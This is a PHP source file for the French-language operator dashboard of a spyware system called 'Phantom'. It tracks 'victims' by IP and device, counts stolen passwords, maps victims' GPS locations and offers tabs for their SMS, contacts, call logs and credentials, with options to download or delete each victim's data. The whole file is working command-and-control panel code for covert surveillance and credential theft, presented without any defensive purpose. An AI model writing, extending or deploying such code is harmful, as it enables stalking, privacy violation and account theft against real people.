<?php
session_start();
require_once '../config.php';

// Vérifier authentification
if (!isset($_SESSION['admin']) && (!isset($_POST['password']) || !password_verify($_POST['password'], ADMIN_PASSWORD))) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phantom Admin</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="/assets/css/dashboard.css">
    </head>
    <body class="login-body">
        <div class="login-container">
            <div class="login-box">
                <h1>🔮 PHANTOM</h1>
                <form method="POST">
                    <input type="password" name="password" placeholder="Mot de passe" required>
                    <button type="submit">Accéder</button>
                </form>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$_SESSION['admin'] = true;

// Statistiques
$stmt = $pdo->query("SELECT COUNT(*) FROM victims");
$totalVictims = $stmt->fetchColumn();

$stmt = $pdo->query("SELECT COUNT(*) FROM victims WHERE last_seen > DATE_SUB(NOW(), INTERVAL 1 HOUR)");
$onlineNow = $stmt->fetchColumn();

$stmt = $pdo->query("SELECT COUNT(*) FROM data WHERE type='location'");
$totalLocations = $stmt->fetchColumn();

$stmt = $pdo->query("SELECT COUNT(*) FROM data WHERE type='credentials'");
$totalCredentials = $stmt->fetchColumn();

// Récupérer les dernières victimes
$stmt = $pdo->query("
    SELECT v.*, 
           (SELECT COUNT(*) FROM data WHERE victim_id=v.id) as data_count,
           (SELECT COUNT(*) FROM locations WHERE victim_id=v.id) as location_count
    FROM victims v
    ORDER BY v.last_seen DESC
    LIMIT 20
");
$victims = $stmt->fetchAll();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Phantom Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <link rel="stylesheet" href="/assets/css/animations.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
</head>
<body>
    <div class="dashboard">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="logo">
                <div class="logo-icon">👻</div>
                <div class="logo-text">PHANTOM</div>
            </div>
            
            <nav class="nav">
                <a href="#" class="nav-item active">
                    <span>📊</span>
                    Dashboard
                </a>
                <a href="#" class="nav-item">
                    <span>🎯</span>
                    Victimes
                </a>
                <a href="#" class="nav-item">
                    <span>📍</span>
                    Localisations
                </a>
                <a href="#" class="nav-item">
                    <span>🔑</span>
                    Credentials
                </a>
                <a href="#" class="nav-item">
                    <span>⚙️</span>
                    Paramètres
                </a>
            </nav>
            
            <div class="sidebar-footer">
                <div class="user-info">
                    <div class="user-avatar">A</div>
                    <div class="user-details">
                        <div class="user-name">Admin</div>
                        <div class="user-role">Super utilisateur</div>
                    </div>
                </div>
            </div>
        </aside>
        
        <!-- Main content -->
        <main class="main">
            <header class="header">
                <h1 class="page-title">Dashboard</h1>
                <div class="header-actions">
                    <button class="btn-refresh" onclick="location.reload()">
                        <span>🔄</span>
                        Rafraîchir
                    </button>
                </div>
            </header>
            
            <!-- Stats cards -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon">🎯</div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $totalVictims ?></div>
                        <div class="stat-label">Victimes totales</div>
                    </div>
                    <div class="stat-trend up">+12%</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon">🟢</div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $onlineNow ?></div>
                        <div class="stat-label">En ligne maintenant</div>
                    </div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon">📍</div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $totalLocations ?></div>
                        <div class="stat-label">Localisations</div>
                    </div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon">🔑</div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $totalCredentials ?></div>
                        <div class="stat-label">Mots de passe</div>
                    </div>
                </div>
            </div>
            
            <!-- Graphique -->
            <div class="chart-card">
                <h3>Activité des dernières 24h</h3>
                <canvas id="activityChart" height="100"></canvas>
            </div>
            
            <!-- Victimes récentes -->
            <div class="table-card">
                <div class="table-header">
                    <h3>Victimes récentes</h3>
                    <div class="table-filters">
                        <input type="text" placeholder="Rechercher..." id="searchInput">
                        <button class="btn-filter">Filtrer</button>
                    </div>
                </div>
                
                <div class="table-responsive">
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>IP</th>
                                <th>OS</th>
                                <th>Première vue</th>
                                <th>Dernière vue</th>
                                <th>Données</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($victims as $v): ?>
                            <tr>
                                <td class="victim-id"><?= substr($v['id'], 0, 16) ?>...</td>
                                <td class="victim-ip"><?= $v['ip'] ?></td>
                                <td>
                                    <span class="badge <?= strpos($v['user_agent'], 'Android') !== false ? 'badge-android' : (strpos($v['user_agent'], 'iPhone') !== false ? 'badge-ios' : 'badge-web') ?>">
                                        <?= strpos($v['user_agent'], 'Android') !== false ? 'Android' : (strpos($v['user_agent'], 'iPhone') !== false ? 'iOS' : 'Web') ?>
                                    </span>
                                </td>
                                <td><?= date('d/m H:i', strtotime($v['first_seen'])) ?></td>
                                <td><?= time_elapsed_string($v['last_seen']) ?></td>
                                <td>
                                    <div class="data-badges">
                                        <span class="data-badge">📁 <?= $v['data_count'] ?></span>
                                        <span class="data-badge">📍 <?= $v['location_count'] ?></span>
                                    </div>
                                </td>
                                <td>
                                    <div class="action-buttons">
                                        <button class="action-btn view" onclick="viewVictim('<?= $v['id'] ?>')" title="Voir">👁️</button>
                                        <button class="action-btn download" onclick="downloadData('<?= $v['id'] ?>')" title="Télécharger">📥</button>
                                        <button class="action-btn delete" onclick="deleteVictim('<?= $v['id'] ?>')" title="Supprimer">🗑️</button>
                                    </div>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            
            <!-- Carte des localisations -->
            <div class="map-card">
                <h3>Dernières localisations</h3>
                <div id="map" style="height: 400px;"></div>
            </div>
        </main>
    </div>
    
    <!-- Modal pour détails victime -->
    <div class="modal" id="victimModal">
        <div class="modal-content modal-lg">
            <div class="modal-header">
                <h2 id="modalTitle">Détails de la victime</h2>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body">
                <div class="victim-tabs">
                    <button class="victim-tab active" onclick="switchTab('info')">ℹ️ Info</button>
                    <button class="victim-tab" onclick="switchTab('sms')">💬 SMS</button>
                    <button class="victim-tab" onclick="switchTab('contacts')">👥 Contacts</button>
                    <button class="victim-tab" onclick="switchTab('calls')">📞 Appels</button>
                    <button class="victim-tab" onclick="switchTab('location')">📍 Localisation</button>
                    <button class="victim-tab" onclick="switchTab('credentials')">🔑 Credentials</button>
                </div>
                <div class="victim-content" id="victimContent"></div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY"></script>
    <script src="/assets/js/dashboard.js"></script>
    <script>
        // Graphique d'activité
        const ctx = document.getElementById('activityChart').getContext('2d');
        new Chart(ctx, {
            type: 'line',
            data: {
                labels: ['00h', '02h', '04h', '06h', '08h', '10h', '12h', '14h', '16h', '18h', '20h', '22h'],
                datasets: [{
                    label: 'Victimes',
                    data: [12, 19, 3, 5, 2, 3, 20, 25, 22, 18, 15, 10],
                    borderColor: '#00ff88',
                    backgroundColor: 'rgba(0,255,136,0.1)',
                    tension: 0.4,
                    fill: true
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { display: false }
                },
                scales: {
                    y: { beginAtZero: true, grid: { color: '#333' } }
                }
            }
        });
        
        // Carte
        function initMap() {
            const map = new google.maps.Map(document.getElementById('map'), {
                center: { lat: 48.8566, lng: 2.3522 },
                zoom: 5,
                styles: [
                    { elementType: "geometry", stylers: [{ color: "#242f3e" }] },
                    { elementType: "labels.text.stroke", stylers: [{ color: "#242f3e" }] },
                    { elementType: "labels.text.fill", stylers: [{ color: "#746855" }] },
                    {
                        featureType: "administrative.locality",
                        elementType: "labels.text.fill",
                        stylers: [{ color: "#d59563" }]
                    },
                    {
                        featureType: "poi",
                        elementType: "labels.text.fill",
                        stylers: [{ color: "#d59563" }]
                    },
                    {
                        featureType: "road",
                        elementType: "geometry",
                        stylers: [{ color: "#38414e" }]
                    },
                    {
                        featureType: "road",
                        elementType: "geometry.stroke",
                        stylers: [{ color: "#212a37" }]
                    },
                    {
                        featureType: "road",
                        elementType: "labels.text.fill",
                        stylers: [{ color: "#9ca5b3" }]
                    },
                    {
                        featureType: "water",
                        elementType: "geometry",
                        stylers: [{ color: "#17263c" }]
                    }
                ]
            });
            
            // Marqueurs des localisations
            <?php
            $stmt = $pdo->query("
                SELECT l.*, v.ip 
                FROM locations l 
                JOIN victims v ON l.victim_id = v.id 
                ORDER BY l.timestamp DESC 
                LIMIT 20
            ");
            while ($loc = $stmt->fetch()):
            ?>
            new google.maps.Marker({
                position: { lat: <?= $loc['lat'] ?>, lng: <?= $loc['lng'] ?> },
                map: map,
                title: '<?= $loc['ip'] ?>',
                animation: google.maps.Animation.DROP
            });
            <?php endwhile; ?>
        }
        
        initMap();
        
        // Fonctions pour le modal
        function viewVictim(id) {
            document.getElementById('victimModal').classList.add('active');
            document.getElementById('modalTitle').innerText = 'Victime: ' + id;
            
            fetch('/api/victims.php?id=' + id)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('victimContent').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                });
        }
        
        function closeModal() {
            document.getElementById('victimModal').classList.remove('active');
        }
        
        function switchTab(tab) {
            document.querySelectorAll('.victim-tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
        }
        
        function downloadData(id) {
            window.location.href = '/api/download.php?id=' + id;
        }
        
        function deleteVictim(id) {
            if (confirm('Supprimer cette victime ?')) {
                fetch('/api/delete.php?id=' + id, { method: 'DELETE' })
                    .then(() => location.reload());
            }
        }
    </script>
</body>
</html>
<?php
function time_elapsed_string($datetime, $full = false) {
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);
    
    $diff->w = floor($diff->d / 7);
    $diff->d -= $diff->w * 7;
    
    $string = array(
        'y' => 'an',
        'm' => 'mois',
        'w' => 'sem',
        'd' => 'jour',
        'h' => 'h',
        'i' => 'min',
        's' => 's',
    );
    
    foreach ($string as $k => &$v) {
        if ($diff->$k) {
            $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');
        } else {
            unset($string[$k]);
        }
    }
    
    if (!$full) $string = array_slice($string, 0, 1);
    return $string ? implode(', ', $string) . ' ago' : 'just now';
}
?>
